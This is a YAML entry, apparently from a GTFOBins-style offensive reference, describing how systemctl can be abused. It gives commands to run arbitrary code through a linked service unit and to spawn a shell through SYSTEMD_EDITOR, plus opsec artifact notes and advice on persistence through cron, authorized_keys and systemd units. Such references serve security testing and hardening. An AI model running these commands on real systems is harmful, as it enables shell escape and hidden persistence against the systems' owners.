---
name: systemctl
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '[Service]
    Type=oneshot
    ExecStart=/path/to/command
    [Install]
    WantedBy=multi-user.target' >/path/to/temp-file.service
    systemctl link /path/to/temp-file.service
    systemctl enable --now /path/to/temp-file.service
  notes: It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo /bin/sh >/path/to/temp-file
    chmod +x /path/to/temp-file
    SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
references:
- https://gtfobins.github.io/gtfobins/systemctl/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
